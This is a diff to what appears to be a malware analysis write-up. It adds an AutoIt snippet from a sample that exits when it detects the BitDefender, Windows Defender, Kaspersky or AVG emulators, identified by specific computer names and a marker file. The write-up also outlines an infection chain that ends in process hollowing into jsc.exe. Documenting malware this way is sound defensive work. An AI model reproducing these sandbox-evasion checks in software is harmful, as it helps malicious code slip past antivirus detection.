@@ -69,6 +69,25 @@ def decode_string(string: str, key: int) -> str:
     return ''.join([chr(int(c) - int(key)) for c in string.split('U')])
 ```
 
+
+```vb
+; BitDefender Emulator
+If(Execute("EnvGet('COMPUTERNAME')") = "tz") Then 
+	Execute("WinClose(AutoItWinGetTitle())")
+
+; Windows Defender Emulator
+If(FileExists("C:\aaa_TouchMeNot_.txt")) Then 
+	Execute("WinClose(AutoItWinGetTitle())")
+
+; Kaspersky Emulator
+If(Execute("EnvGet('COMPUTERNAME')") = "NfZtFbPfH") Then 
+	Execute("WinClose(AutoItWinGetTitle())")
+
+; AVG Emulator
+If(Execute("EnvGet('COMPUTERNAME')") = "ELICZ") Then 
+	Execute("WinClose(AutoItWinGetTitle())")
+```
+
 Installer → Quella.mp3 (BAT) → Mantenga.exe.pif (Loader) → jsc.exe
 
 Looks like they are doing process hollowing from the AutoIT script.
